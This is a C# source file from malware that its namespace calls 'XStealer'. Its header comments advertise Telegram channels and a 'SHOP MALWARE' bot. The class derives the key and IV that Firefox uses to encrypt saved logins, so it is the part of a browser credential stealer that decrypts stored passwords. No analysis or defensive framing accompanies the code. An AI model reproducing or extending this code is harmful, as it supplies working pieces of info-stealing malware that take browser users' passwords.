// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Gecko
{
    using System;
    using System.Security.Cryptography;

    public class MozillaPBE
    {
        private byte[] GlobalSalt { get; } = null;
        private byte[] MasterPassword { get; } = null;
        private byte[] EntrySalt { get; } = null;
        public byte[] DataKey { get; private set; } = null;
        public byte[] DataIV { get; private set; } = null;
        
        public MozillaPBE(byte[] salt, byte[] password, byte[] entry) { GlobalSalt = salt; MasterPassword = password; EntrySalt = entry; }

        public void Compute()
        {
            try
            {
                byte[] array = new byte[GlobalSalt.Length + MasterPassword.Length];
                Array.Copy(GlobalSalt, 0, array, 0, GlobalSalt.Length);
                Array.Copy(MasterPassword, 0, array, GlobalSalt.Length, MasterPassword.Length);
                using var sHA1CryptoServiceProvider = new SHA1CryptoServiceProvider();
                byte[] array2 = sHA1CryptoServiceProvider.ComputeHash(array);
                byte[] array3 = new byte[array2.Length + EntrySalt.Length];
                Array.Copy(array2, 0, array3, 0, array2.Length);
                Array.Copy(EntrySalt, 0, array3, array2.Length, EntrySalt.Length);
                byte[] array4 = new byte[20];
                Array.Copy(EntrySalt, 0, array4, 0, EntrySalt.Length);
                for (int i = EntrySalt.Length; i < 20; i++) { array4[i] = 0; }
                byte[] array5 = new byte[array4.Length + EntrySalt.Length];
                Array.Copy(array4, 0, array5, 0, array4.Length);
                Array.Copy(EntrySalt, 0, array5, array4.Length, EntrySalt.Length);
                byte[] array6, array9, key = sHA1CryptoServiceProvider.ComputeHash(array3);
                using var hMACSHA = new HMACSHA1(key);
                array6 = hMACSHA?.ComputeHash(array5);
                byte[] array7 = hMACSHA.ComputeHash(array4);
                byte[] array8 = new byte[array7.Length + EntrySalt.Length];
                Array.Copy(array7, 0, array8, 0, array7.Length);
                Array.Copy(EntrySalt, 0, array8, array7.Length, EntrySalt.Length);
                array9 = hMACSHA?.ComputeHash(array8);
                byte[] array10 = new byte[array6.Length + array9.Length];
                Array.Copy(array6, 0, array10, 0, array6.Length);
                Array.Copy(array9, 0, array10, array6.Length, array9.Length);
                DataKey = new byte[24];
                for (int j = 0; j < DataKey.Length; j++) { DataKey[j] = array10[j]; }
                DataIV = new byte[8];
                int num = DataIV.Length - 1;
                for (int num2 = array10.Length - 1; num2 >= array10.Length - DataIV.Length; num2--)
                {
                    DataIV[num] = array10[num2];
                    num--;
                }
            }
            catch { }
        }
    }
}